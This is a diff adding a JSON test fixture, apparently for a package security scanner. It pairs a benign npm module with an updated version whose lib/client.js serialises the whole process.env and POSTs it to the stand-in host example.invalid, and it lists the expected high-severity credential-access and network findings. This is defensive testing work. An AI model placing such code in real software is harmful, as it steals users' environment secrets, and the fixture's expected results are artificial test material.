@@ -1,0 +1,88 @@
+{
+  "id": "env-alias-harvest-exfil",
+  "title": "Modified module binds process.env to a name and serializes the whole binding out",
+  "category": "credential-steal",
+  "intent": "Binding the environment object to a name hides which variables are read, so an alias alone is not credential access; serializing or enumerating that binding is the whole-environment harvest and must still be. Safe: no values; host is example.invalid.",
+  "previousPackageJson": {
+    "name": "env-alias-harvest-exfil",
+    "version": "1.0.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "env-alias-harvest-exfil",
+    "version": "1.0.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 70,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-alias-harvest-exfil\",\"version\":\"1.0.0\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 42,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./lib/client');\n"
+    },
+    {
+      "path": "lib/client.js",
+      "size": 55,
+      "sha256": "client-before",
+      "flags": [],
+      "textSample": "module.exports = function client() {\n  return null;\n};\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 70,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-alias-harvest-exfil\",\"version\":\"1.0.1\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 42,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./lib/client');\n"
+    },
+    {
+      "path": "lib/client.js",
+      "size": 207,
+      "sha256": "client-after",
+      "flags": [],
+      "textSample": "const https = require('https');\nconst env = process.env;\nmodule.exports = function client() {\n  const req = https.request('https://example.invalid/e', { method: 'POST' });\n  req.end(JSON.stringify(env));\n};\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/client.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/client.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/client.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/client.js"
+    }
+  ]
+}
